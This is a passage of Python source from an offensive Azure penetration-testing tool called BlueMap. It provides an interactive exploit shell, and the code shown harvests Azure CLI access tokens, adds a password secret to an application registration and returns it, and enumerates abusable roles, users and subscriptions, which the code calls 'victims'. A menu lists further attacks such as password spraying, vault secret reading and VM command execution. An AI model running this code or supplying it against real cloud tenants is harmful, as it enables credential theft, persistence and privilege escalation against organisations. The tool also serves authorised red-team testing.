                currentdata = {'name': currenttemplate['name'], 'id': currenttemplate['id']}
                if 'parameters' in currenttemplate['properties']:
                    currentdata['params'] = currenttemplate['properties']['parameters']
                else:
                    continue
                if 'outputs' in currenttemplate['properties']:
                    currentdata['outputs'] = currenttemplate['properties']['outputs']
                else:
                    continue
                finalResult.append(currentdata)
    return finalResult
    
def CHK_AppRegOwner(appId):
    global accessTokenGraph
    if CheckSubscriptionReqGraphState():
        r = sendGETRequest("https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"), accessTokenGraph)
        appData = r['json']['value'][0]['id']
        AppOwners = sendGETRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/owners", accessTokenGraph)
        if str(parseUPN()) in AppOwners["response"]:
            return "Yes! Try Exploit: Reader/abuseServicePrincipals"
        else:
            return "N/A"
    else:
        print("Need to refresh token / obtain token for MSGraph.")

def RD_addPasswordForEntrepriseApp(appId):
    global accessTokenGraph
    if CheckSubscriptionReqGraphState():
        r = sendGETRequest(
            "https://graph.microsoft.com/v1.0/applications?$filter=" + urllib.parse.quote("appId eq '" + appId + "'"),
            accessTokenGraph)
        appData = r['json']['value'][0]['id']
        req = {
                "passwordCredential": {
                    "displayName": "Password"
                }
        }
        addSecretPwd = sendPOSTRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword", req, accessTokenGraph)
        if addSecretPwd['status_code'] == 200:
            pwdOwn = addSecretPwd['json']
            return "AppId: " + appId + "| Pwd: " + pwdOwn['secretText']
        else:
            return "N/A"
    else:
        print("Need to refresh token / obtain token for MSGraph.")

def tryGetToken():
    global accessTokenGraph, accessTokenVault, hasGraphAccess, hasMgmtAccess, hasVaultEnabled
    try:
        accessToken = None
        add = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=https://management.azure.com/"], capture_output=True, text=True)
        graph = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=https://graph.microsoft.com"], capture_output=True, text=True)
        vault = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=https://vault.azure.net"], capture_output=True, text=True)
        if 'The term \'az\' is not recognized as the name of a cmd' in add.stderr or graph.stderr:
            print("No Az Cli model installed. Please install if possible and try again.")
            print("Use the command to install: Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; rm .\AzureCLI.msi")
            print("Failed generate token.")
        elif 'No subscription found' in add.stderr or graph.stderr:
            print("No subscriptions were found. You will need to switch to tenant-level access manually: az login --allow-no-subscriptions")
            print("Failed generate token. You may need to login or try manually.")
        elif 'Exception' in add.stderr or graph.stderr:
            print("Unable to use azure cli for generating token")
            print("Failed generate token. You may need to login or try manually.")
        elif add.stdout == "" or graph.stdout == "":
            print("Failed generate token. You may need to login or try manually.")
        else:
            if vault.stdout == "":
                hasVaultEnabled = False
            else:
                vaultToken = json.loads(vault.stdout)
                accessTokenVault = vaultToken['accessToken']
                hasVaultEnabled = True
                hasGraphAccess = True
                hasMgmtAccess = True
                print("Captured token done. All set!")
                jres = json.loads(add.stdout)
                jresgraph = json.loads(graph.stdout)
                accessToken = jres['accessToken']
                accessTokenGraph = jresgraph['accessToken']
        return accessToken
    except KeyError:
        return False
    except:
        return False



def canRoleBeAbused(currentRoleName):
    vaultAbuseRoles = ["Key Vault Secrets Officer", "Key Vault Secrets User", "Key Vault Administrator"]
    vaultAbuseCertAndKeysOnlyRoles = ["Key Vault Certificates Officer", "Key Vault Crypto Officer"]
    shadowRisks = ["Cloud Application Administrator", "Application Administrator", "Password Administrator",
                   "Privileged Authentication Administrator", "Authentication Administrator",
                   "Privileged Role Administrator", "User Account Administrator", "User Administrator", "User Access Administrator",
                   "Helpdesk Administrator", "Directory Synchronization Accounts", "Hybrid Identity Administrator"]
    classicAdministartors = ["Account Administrator", "Service Administrator", "Co-Administrator"]
    if currentRoleName in vaultAbuseRoles:
        return currentRoleName + "|" + "allows to retrieve secrets from key vault."
    elif currentRoleName in vaultAbuseCertAndKeysOnlyRoles:
        return currentRoleName + "|" + "allows to retrieve Certifications/Keys ONLY from key vault."
    elif currentRoleName == "Contributor":
        return currentRoleName + "|" + "can manage all Azure services, without the ability to create role assignments."
    elif currentRoleName == "Reader":
        return currentRoleName + "|" + "allows to read data of the resource."
    elif currentRoleName == "Global Reader":
        return currentRoleName + "|" + "Can read everything in Azure AD, without the ability to update."
    elif currentRoleName == "Global Administrator" or currentRoleName == "Company Administrator":
        return currentRoleName + "|" + "has a god mode, which can manage all aspects of Azure AD. (think like Domain Admin)"
    elif currentRoleName == "User Administrator" or currentRoleName == "Groups Administrators" or currentRoleName == "Directory Writers":
        return currentRoleName + "|" + "has permissions to modify group membership in Azure AD."
    elif currentRoleName == "Virtual Machine Contributor":
        return currentRoleName + "|" + "allows manage of VMs including disks, snapshots, extensions, and password restoration."
    elif currentRoleName == "Automation Operator" or currentRoleName == "Automation Contributor":
        return currentRoleName + "|" + "allows create and manage jobs, and read runbook names and properties for all runbooks in an Automation account."
    elif currentRoleName == "Storage Blob Data Reader":
        return currentRoleName + "|" + "allows read, write, and delete storage containers and blobs."
    elif currentRoleName == "User Access Administrator":
        return currentRoleName + "|" + "has manage access to all resources within the subscription."
    elif currentRoleName in shadowRisks:
        return currentRoleName + "|" + " has full directory admin rights, easy way to esclate (i.e. use change password)."
    elif currentRoleName in classicAdministartors:
        return currentRoleName + "|" + "Is found as one of the three classic subscription administrative roles. Please notice: Service Administrator and Account Administrator are equivalent to the Owner role in the subscription."
    elif currentRoleName == "Owner":
        return currentRoleName + "|" + "has high privlieged permission, allows to esclate to subscription/tenat level via given resource."
    return False


def canPermissionBeAbused(currentPermission):
    vmPermissions = ["Microsoft.Compute/virtualMachines/runCommand/action",
                     "Microsoft.Compute/virtualMachines/extensions/*"]
    vmAllowDeployPermission = ["Microsoft.Compute/virtualMachines/write"]
    AutomationAccounts = ["Microsoft.Automation/automationAccounts/*",
                          "Microsoft.Automation/automationAccounts/jobs/write",
                          "Microsoft.Automation/automationAccounts/jobSchedules/write"]
    AutomationAccountsRO = ["Microsoft.Automation/automationAccounts/read",
                            "Microsoft.Automation/automationAccounts/runbooks/read",
                            "Microsoft.Automation/automationAccounts/schedules/read",
                            "Microsoft.Automation/automationAccounts/jobs/read"]
    StorangeAccountAbuse = ["Microsoft.ClassicStorage/storageAccounts/listKeys/action",
                            "Microsoft.ClassicStorage/storageAccounts/listKeys/action",
                            "Microsoft.Storage/listAccountSas/action",
                            "Microsoft.Storage/listServiceSas/action"]
    ARMTemplateAbuse = ["Microsoft.Resources/deployments/*"]
    DirectoryAbuse = ["Microsoft.Resources/deployments/*"]
    AllowGroupModify = ["microsoft.directory/groups/members/update"]
    AllowUserCreation = ["microsoft.directory/users/create"]
    allowsSPCreation = ["microsoft.directory/servicePrincipals/create"]
    allowsSPUpdate = ["microsoft.directory/servicePrincipals/credentials/update"]
    ExtensionsAbuse = ["Microsoft.ClassicCompute/virtualMachines/extensions/*",
                       "Microsoft.Compute/virtualMachines/extensions/read",
                       "Microsoft.Compute/virtualMachines/extensions/write"]
    HybridCompute = ["Microsoft.HybridCompute/machines/extensions/write"]
    AllSubscriptions = ["Microsoft.Resources/subscriptions/resourcegroups/deployments/*"]
    AllowToManageRBAC = ["Microsoft.Authorization/roleAssignments/*", "Microsoft.Authorization/*",
                         "Microsoft.Authorization/*/Write", "Microsoft.Authorization/roleAssignments/*",
                         "Microsoft.Authorization/roleDefinition/*", "Microsoft.Authorization/roleDefinitions/*",
                         "Microsoft.Authorization/elevateAccess/Action", "Microsoft.Authorization/roleDefinition/write",
                         "Microsoft.Authorization/roleDefinitions/write",
                         "Microsoft.Authorization/roleAssignments/write",
                         "Microsoft.Authorization/classicAdministrators/write"]
    if currentPermission == "*":
        return "" + "|" + "That's means to have a Contributor/Owner permission on resources."
    elif currentPermission in vmPermissions:
        return currentPermission + "|" + "allows execute code on Virtual Machines."
    elif currentPermission in allowsSPCreation:
        return currentPermission + "|" + "allows creation of new application registration (service principle)."
    elif currentPermission in allowsSPUpdate:
        return currentPermission + "|" + "allows add service principle for an existing application registration."
    elif currentPermission in AllowGroupModify:
        return currentPermission + "|" + "allows modify group membership in Azure AD."
    elif currentPermission in AllowUserCreation:
        return currentPermission + "|" + "allows new user creation in Azure AD."
    elif currentPermission in vmAllowDeployPermission:
        return currentPermission + "|" + "allows VM deployment or configuration of existing VM."
    elif currentPermission in StorangeAccountAbuse:
        return currentPermission + "|" + "can abuse storage accounts (i.e., view blobs)."
    elif currentPermission in ARMTemplateAbuse:
        return currentPermission + "|" + "allows create and execute of deployment actions."
    elif all(k in currentPermission for k in
             ("Microsoft.Resources/deployments/read", "Microsoft.Resources/subscriptions/resourceGroups/read")):
        return currentPermission + "|" + "have the ability to view ARM templates and history data."
    elif currentPermission in ExtensionsAbuse or currentPermission in HybridCompute:
        return currentPermission + "|" + "allows abuse of VM extensions. (make sure that you have read + write for Custome Script extenstions)"
    elif currentPermission in AllSubscriptions:
        return currentPermission + "|" + "has permission for all subscriptions."
    elif currentPermission == "*/read":
        return currentPermission + "|" + "has read all permission for data."
    elif currentPermission in AutomationAccounts:
        return currentPermission + "|" + "has ability to create automation account jobs (runbooks)."
    elif currentPermission in AutomationAccountsRO:
        return currentPermission + "|" + "has ability to read automation jobs (runbooks)."
    elif currentPermission == "Microsoft.Authorization/*/read":
        return currentPermission + "|" + "has permission to read roles and role assignments."
    elif currentPermission in AllowToManageRBAC:
        return currentPermission + "|" + "able to preform RBAC operations (i.e., add permissions,roles)."
    return False


def shadownAccounts():
    print("Checking all users within current subscription = " + str(TargetSubscription) + "...")
    field_names2 = ["#", "UserName", "RoleName", "Permission/Scope", "Details"]
    rows2 = []
    print("Lookup for risky RoleAssignments...")
    print("Lookup for risky RolePermissions...")
    for UserRecord in RD_ListAllUsers()['value']:
        token = urllib.parse.quote("assignedTo('"+UserRecord['id']+"')")
        allPermRolesAssigns = GetAllRoleAssignmentsForSubscriptionFilterd(TargetSubscription, token)
        allPermRolesAssignsRecordsCount = 0
        for role in allPermRolesAssigns['value']:
            currentRoleInformation = GetAllRoleDefinitionsUnderId(role['properties']['roleDefinitionId'])
            currentRoleScope = role['properties']['scope']
            currentRoleName = currentRoleInformation['properties']['roleName']
            if canRoleBeAbused(currentRoleName) is not False:
                rows2.append(
                    {"#": allPermRolesAssignsRecordsCount, "UserName": UserRecord['userPrincipalName'],
                     "RoleName": currentRoleName,
                     "Permission/Scope": currentRoleScope,
                     "Details": canRoleBeAbused(currentRoleName).split("|")[1]}
                )
            else:
                continue
            allPermRolesAssignsRecordsCount += 1
        for rolePermission in allPermRolesAssigns['value']:
            if len(rolePermission) < 1:
                continue
            currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(rolePermission['properties']['roleDefinitionId'])
            currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
            currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
            for permission in currentRolePermissions:
                if canPermissionBeAbused(permission) is not False:
                    rows2.append(
                        {"#": allPermRolesAssignsRecordsCount, "UserName": UserRecord['userPrincipalName'],"RoleName": currentRolePermissionName,
                         "Permission/Scope": permission,
                         "Details": canPermissionBeAbused(permission).split("|")[1]}
                    )
                else:
                    continue
                allPermRolesAssignsRecordsCount += 1
    print(make_table(field_names2, rows2))
    print("Completed.")

def AutoRecon():

    print("\nRunning Checks..")

    print("\n===== Checking Available Resources =====\n")
    print("Checking all Storage Accounts..")
    totalStorageAccounts = len(RD_ListAllStorageAccounts())
    print("Checking all VMS...")
    totalVMs = len(RD_ListAllVMs())
    print("Checking all deployments...")
    totalDeployments = len(RD_ListAllDeployments())
    print("Checking all app registrations...")
    totalAppRegistrations = len(RD_AddAppSecret())
    print("Checking all ACRs...")
    totalACRs = len(RD_ListAllACRs())
    print("Checking all automation runbooks...")
    totalRubBooks = len(RD_ListRunBooksByAutomationAccounts())

    print("\nTotal Found:")
    print("Storage Account: " + str(totalStorageAccounts))
    print("Virtual Machines: " + str(totalVMs))
    print("Deployments: " + str(totalDeployments))
    print("RunBooks: " + str(totalRubBooks))
    print("App.Registration: " + str(totalAppRegistrations))
    print("ACRs: " + str(totalACRs))

    if hasVaultEnabled:
        totalValuts = len(RD_ListAllVaults())
        print("Vaults: " + str(totalValuts))

    print("\n===== Checking Current User =====\n")

    print("Logged as: ")
    currentProfile()
    print("User Id: " + parseUPNObjectId())
    currentScope()
    

    print("\n===== Checking all attached subscriptions =====\n")

    listSubs = ListSubscriptionsForToken()
    field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
    rows = []
    victims = {}
    subRecordCount = 0
    for subRecord in listSubs['value']:
        victims[subRecordCount] = {"name": subRecord['displayName']}
        rows.append(
            {"#": subRecordCount, "SubscriptionId": subRecord['subscriptionId'],
             "displayName": subRecord['displayName'], "State": subRecord['state'],
             "Plan": subRecord['subscriptionPolicies']['quotaId'],
             "spendingLimit": subRecord['subscriptionPolicies']['spendingLimit']}
        )
        subRecordCount += 1
    print(make_table(field_names, rows))

    print("\n===== Checking Current Subscription Permissions =====\n")

    print("Checking all RolePermissions & RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...\n")

    allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
    token = urllib.parse.quote("assignedTo('"+str(parseUPNObjectId())+"')")
    allRolesAssigns = GetAllRoleAssignmentsForSubscriptionFilterd(str(TargetSubscription),token)
    field_names = ["#", "RoleName", "Can Abused?", "Details"]
    rows = []
    allRolesAssignsRecordsCount = 0
    for role in range(0, len(allRolesAssigns)):
        resultAllRolesAssigns = allRolesAssigns
        currentRoleInformation = GetAllRoleDefinitionsUnderId(
            resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
        currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
        currentRoleName = currentRoleInformation['properties']['roleName']
        if canRoleBeAbused(currentRoleName) is not False:
            rows.append(
                {"#": allRolesAssignsRecordsCount,
                 "RoleName": currentRoleName,
                 "Can Abused?": "Yes",
                 "Details": canRoleBeAbused(currentRoleName).split("|")[1]}
            )
        else:
            rows.append(
                {"#": allRolesAssignsRecordsCount,
                 "RoleName": currentRoleName,
                 "Can Abused?": "No",
                 "Details": "N/A"}
            )
        allRolesAssignsRecordsCount += 1
    
    for rolePermission in range(0, len(allPermRolesAssigns)):
        resultAllRolesAssigns = allPermRolesAssigns
        currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
            resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
        if len(currentRolePermissionInformation) == 0:
            continue
        else:
            currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
            currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
            for permission in currentRolePermissions:
                if canPermissionBeAbused(permission) is not False:
                    rows.append(
                        {"#": allRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                        "Permission Assigned": permission, "Can Abused?": "Yes",
                        "Details": canPermissionBeAbused(permission).split("|")[1]}
                    )
                else:
                    rows.append(
                        {"#": allRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                        "Permission Assigned": permission, "Can Abused?": "No",
                        "Details": "N/A"}
                    )
                allRolesAssignsRecordsCount += 1

    print(make_table(field_names, rows))


def GetAllRoleAssignmentsUnderSubscription(subscriptionId):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", Token)
    return r['json']

def GetAllRoleAssignmentsForSubscriptionFilterd(subscriptionId, filter):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01&$filter="+filter, Token)
    return r['json']

def RD_DumpRunBookContent(runbookGUID):
    global Token
    r = sendGETRequest("https://management.azure.com/" + runbookGUID + "/content?api-version=2019-06-01",Token)
    if r["status_code"] == 200:
        result = r["response"]
    else:
        result = None
    return result

def HLP_GetAzVMPublicIPNew(networkGuid):
    global Token
    r = sendGETRequest("https://management.azure.com/"+networkGuid+"?api-version=2022-05-01", Token)
    return r['json']

def HLP_GetAzVMPublicIP(subscriptionId,resourceGroupName,publicIpAddressName):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/"+subscriptionId+"/resourceGroups/"+resourceGroupName+"/providers/Microsoft.Network/publicIPAddresses/"+publicIpAddressName+"?api-version=2022-01-01", Token)
    if r["status_code"] == 200:
        if "ipAddress" not in r['json']['properties']:
            result = "N/A"
        else:
            result = r['json']['properties']['ipAddress']
    else:
        result = "N/A"
    return result

def GetAllRoleAssignmentsUnderSubscriptionAndResourceGroup(subscriptionId,resourceGroupId):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/"+resourceGroupId+"/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01", Token)
    return r['json']


def GetAllRoleDefinitionsUnderId(roleId):
    global Token
    r = sendGETRequest("https://management.azure.com/" + roleId + "?api-version=2015-07-01", Token)
    return r['json']


def AboutWindow():
    print("BlueMap Developed By Maor Tal (@th3location)")


def getToken():
    return Token

def ListSubscriptionsForToken():
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
    return r['json']

def GetAllResourcesUnderSubscription(subscriptionId, token):
    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10", token)
    return r['json']

def GetAllResourceGroupsUnderSubscription(subscriptionId):
    global Token
    r = sendGETRequest("https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10", Token)
    return r['json']

def attackWindow():
    banner = '''
    ######                       #     #               
#     # #      #    # ###### ##   ##   ##   #####  
#     # #      #    # #      # # # #  #  #  #    # 
######  #      #    # #####  #  #  # #    # #    # 
#     # #      #    # #      #     # ###### #####  
#     # #      #    # #      #     # #    # #      
######  ######  ####  ###### #     # #    # #    
'''
    '''
    print(banner)
    '''
    supportedCommands = [
        "version",
        "tid",
        "whoami",
        "scopes",
        "get_subs",
        "set_target",
        "get_target",
        "get_resources",
        "get_res",
        "surface",
        "sts",
        "subs",
        "autorecon",
        "shadowacc",
        "privs",
        "perms",
        "exploits",
        "showtoken",
        "deltoken",
        "run",
        "use",
        "exit",
        "back"
    ]
    exploits = [
        "Token/AuthToken",
        "Token/SPToken",
        "Token/GenToken",
        "Token/SetToken",
        "Token/RefreshToken",
        "External/OSINT",
        "External/EmailEnum",
        "External/PasswordSpray",
        "Reader/ListAllUsers",
        "Reader/ExposedAppServiceApps",
        "Reader/ListAllAzureContainerRegistry",
        "Reader/ListAutomationAccounts",
        "Reader/DumpAllRunBooks",
        "Reader/ListAllRunBooks",
        "Reader/ListAllVaults",
        "Reader/ListAppServiceSites",
        "Reader/ListVirtualMachines",
        "Reader/ListAllStorageAccounts",
        "Reader/ListStorageAccountsKeys",
        "Reader/ARMTemplatesDisclosure",
        "Reader/ListServicePrincipals",
        "Reader/abuseServicePrincipals",
        "Contributor/ListACRCredentials",
        "Contributor/ReadVaultSecret",
        "Contributor/RunCommandVM",
        "Contributor/VMExtensionResetPwd",
        "Contributor/VMExtensionExecution",
        "Contributor/VMDiskExport",
        "Contributor/DumpWebAppPublishProfile",
        "GlobalAdministrator/elevateAccess"
    ]
    while (True):
        global TargetSubscription
        global TotalTargets
        global Token
        global ExploitChoosen

        if ExploitChoosen is not None:
            mode = input("$ exploit(" + ExploitChoosen + ") >> ")
        else:
            mode = input("$ bluemap >> ")

        checkCmdInital = mode.split(" ")
        if checkCmdInital[0] not in supportedCommands:
            print("Not supported command. Supported commands: " + str(supportedCommands))
        else:
            if mode == "run" and ExploitChoosen is None:
                print("Use run command only within an exploit.")
            elif mode == "version":
                print("Bluemap 1.0.0-Beta")
            elif mode == "whoami":
                currentProfile()
            elif mode == "tid":
                if Token == None:
                    print("Please set target victim access token. Use Token/* exploits.")
                else:
                    parseTenantId()
            elif mode == "scopes":
                currentScope()
            elif mode == "get_subs" or mode == "subs":
                listSubs = ListSubscriptionsForToken()
                if listSubs.get('value') == None:
                    print("Error occured. Result: " + str(listSubs['error']['message']))
                else:
                    field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
                    rows = []
                    subRecordCount = 0
                    for subRecord in listSubs['value']:
                        rows.append(
                            {"#": subRecordCount, "SubscriptionId": subRecord['subscriptionId'],
                             "displayName": subRecord['displayName'], "State": subRecord['state'],
                             "Plan": subRecord['subscriptionPolicies']['quotaId'],
                             "spendingLimit": subRecord['subscriptionPolicies']['spendingLimit']}
                        )
                        subRecordCount += 1
                        TotalTargets.append(subRecord['subscriptionId'])
                    print(make_table(field_names, rows))
            elif "set_target" in mode or "sts" in mode:
                argSub = mode.split(" ")
                if len(argSub) < 2:
                    print("No subscription has been selected.")
                else:
                    if argSub[1] not in TotalTargets:
                        print("Invalid target subscription.")
                    else:
                        print("Set to target SubscriptionId " + argSub[1])
                        TargetSubscription = argSub[1]
            elif "get_target" in mode:
                print("Current Target SubscriptionId = " + str(TargetSubscription))
            elif "autorecon" in mode:
                if TargetSubscription == None:
                    print("Use set_target to set a subscription to work on.")
                else:
                    if CheckSubscriptionReqGraphState():
                        AutoRecon()
                    else:
                        print("Missing MSGraphs scope in current user token for autorecon module.\nAbort!")
            elif "shadowacc" in mode:
                if TargetSubscription == None:
                    print("Use set_target to set a subscription to work on.")
                else:
                    shadownAccounts()
            elif "iam_scan" in mode:
                if TargetSubscription == None:
                    print("Use set_target to set a subscription to work on.")
                else:
                    print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
                    allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                    field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
                    rows = []
                    allRolesAssignsRecordsCount = 0
                    for role in range(0, len(allRolesAssigns)):
                        resultAllRolesAssigns = allRolesAssigns
                        currentRoleInformation = GetAllRoleDefinitionsUnderId(
                            resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                        currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
                        currentRoleName = currentRoleInformation['properties']['roleName']
                        if canRoleBeAbused(currentRoleName) is not False:
                            rows.append(
                                {"#": allRolesAssignsRecordsCount,
                                 "RoleName": currentRoleName,
                                 "Scope": currentRoleScope,
                                 "Can Abused?": "Yes",
                                 "Details": canRoleBeAbused(currentRoleName).split("|")[1]}
                            )
                        else:
                            rows.append(
                                {"#": allRolesAssignsRecordsCount,
                                 "RoleName": currentRoleName,
                                 "Scope": currentRoleScope,
                                 "Can Abused?": "No",
                                 "Details": "N/A"}
                            )
                        allRolesAssignsRecordsCount += 1
                    print(make_table(field_names, rows))
                    print("\nChecking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
                    allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                    field_names2 = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
                    rows2 = []
                    allPermRolesAssignsRecordsCount = 0
                    for rolePermission in range(0, len(allPermRolesAssigns)):
                        resultAllRolesAssigns = allPermRolesAssigns
                        currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
                            resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
                        currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                        currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                        for permission in currentRolePermissions:
                            if canPermissionBeAbused(permission) is not False:
                                rows2.append(
                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                                     "Permission Assigned": permission, "Can Abused?": "Yes",
                                     "Details": canPermissionBeAbused(permission).split("|")[1]}
                                )
                            else:
                                rows2.append(
                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                                     "Permission Assigned": permission, "Can Abused?": "No",
                                     "Details": "N/A"}
                                )
                            allPermRolesAssignsRecordsCount += 1
                    print(make_table(field_names2, rows2))
            elif "privs" in mode:
                if TargetSubscription == None:
                    print("Use set_target to set a subscription to work on.")
                else:
                    print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
                    allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
                    field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
                    rows = []
                    allRolesAssignsRecordsCount = 0
                    for role in range(0, len(allRolesAssigns)):
                        currentRoleInformation = GetAllRoleDefinitionsUnderId(allRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                        currentRoleScope = allRolesAssigns['value'][role]['properties']['scope']
                        currentRoleName = currentRoleInformation['properties']['roleName']
                        if canRoleBeAbused(currentRoleName) is not False:
                            rows.append(
                                {"#": allRolesAssignsRecordsCount,
                                 "RoleName": currentRoleName,
                                 "Scope": currentRoleScope,
                                 "Can Abused?": "Yes",
                                 "Details": canRoleBeAbused(currentRoleName).split("|")[1]}
                            )
                        else:
                            rows.append(
                                {"#": allRolesAssignsRecordsCount,
                                 "RoleName": currentRoleName,
                                 "Scope": currentRoleScope,
                                 "Can Abused?": "No",
                                 "Details": "N/A"}
                            )
                        allRolesAssignsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "perms" in mode:
                if TargetSubscription == None:
                    print("Use set_target to set a subscription to work on.")
                else:
                    print("Checking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
                    token = urllib.parse.quote("assignedTo('"+str(parseUPNObjectId())+"')")
                    allPermRolesAssigns = GetAllRoleAssignmentsForSubscriptionFilterd(TargetSubscription, token)
                    field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
                    rows = []
                    allPermRolesAssignsRecordsCount = 0
                    for rolePermission in range(0, len(allPermRolesAssigns)):
                        resultAllRolesAssigns = allPermRolesAssigns
                        currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
                        resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
                        currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                        currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                        for permission in currentRolePermissions:
                            if canPermissionBeAbused(permission) is not False:
                                rows.append(
                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                                     "Permission Assigned": permission, "Can Abused?": "Yes",
                                     "Details": canPermissionBeAbused(permission).split("|")[1]}
                                )
                            else:
                                rows.append(
                                    {"#": allPermRolesAssignsRecordsCount, "RoleName": currentRolePermissionName,
                                     "Permission Assigned": permission, "Can Abused?": "No",
                                     "Details": "N/A"}
                                )
                            allPermRolesAssignsRecordsCount += 1
                    print(make_table(field_names, rows))
            elif "get_resources" in mode or "get_res" in mode:
                if TargetSubscription == None:
                    print("Please set target subscription.")
                else:
                    print("Listing resources under SubscriptionId = " + str(TargetSubscription) + "...")
                    resultResources = GetAllResourcesUnderSubscription(str(TargetSubscription), Token)
                    resultsInternalRes = resultResources['value']
                    field_names = ["#", "Resource Name", "Type", "Location"]
                    rows = []
                    subResRecordCount = 0
                    for objRes in range(0, len(resultsInternalRes)):
                        resultResources = resultsInternalRes
                        subResRecordCount += 1
                        rows.append(
                            {"#": subResRecordCount, "Resource Name": resultResources[objRes]['name'],
                             "Type": resultResources[objRes]['type'], "Location": resultResources[objRes]['location']}
                        )
                    print(make_table(field_names, rows))
            elif mode == "exploits":
                field_names = ["#", "Name"]
                rows = []
                exploitCount = 0
                for exploit in exploits:
                    rows.append(
                        {"#": exploitCount, "Name": exploit}
                    )
                    exploitCount += 1
                print(make_table(field_names, rows))
            elif "use" in mode:
                argExpSub = mode.replace("use ", "").replace(" ", "")
                if argExpSub == "use":
                    print("please choose an exploit")
                else:
                    checkExploitInital = mode.split("use ")
                    if checkExploitInital[1] not in exploits:
                        print("Not supported exploit. Supported exploits: " + str(exploits))
                    else:
                        if "External/" in checkExploitInital[1]:
                            ExploitChoosen = argExpSub
                        else:
                            if hasTokenInPlace():
                                ExploitChoosen = argExpSub
                            else:
                                if "Token/" in checkExploitInital[1]:
                                    ExploitChoosen = argExpSub
                                else:
                                    print("Please set target victim access token. Use Token/* exploits.")
            elif mode == "back" or mode == "exit":
                if ExploitChoosen is not None:
                    ExploitChoosen = None
                else:
                    exit
            elif mode == "showtoken":
                print(getToken())
            elif mode == "deltoken":
                print("Resetting token..")
                setToken("")
            elif "Token/SPToken" in ExploitChoosen and mode == "run":
                TenantId = input("Enter TenantId: ")
                AppId = input("Enter AppId: ")
                Secret = input("Enter Secret: ")
                r = sendPOSTRequestSPToken(TenantId, AppId, Secret)
                response = r["json"]
                if 'access_token' in response:
                    print("Credentials OK, Generate token...")
                    initToken(response['access_token'], False)
                    print("Done.")
                else:
                    print("Invalid Service Principle AppId / Secret / TenantId.")
            elif "Token/GenToken" in ExploitChoosen and mode == "run":
                print("Trying getting token automatically for you...")
                AutoGenToken = True
                token = tryGetToken()
                if token:
                    initToken(token, False)
            elif "Token/SetToken" in ExploitChoosen and mode == "run":
                print("Please paste your Azure token here:")
                token = input("Enter Token:")
                check = token.split(".")[1]
                audAttribue = json.loads(base64.b64decode(check))['aud']
                if audAttribue != "https://management.azure.com/":
                    print("Error: Token/SetToken support only management.azure.com scope tokens.")
                else:
                    initToken(token, True)
                    print("All set.")
            elif "Token/RefreshToken" in ExploitChoosen and mode == "run":
                ''' For Token/GenToken method '''
                if AutoGenToken == True:
                    token = tryGetToken()
                    if token:
                        initToken(token, False)
                        print("Token Refresh. Done.")
                else:
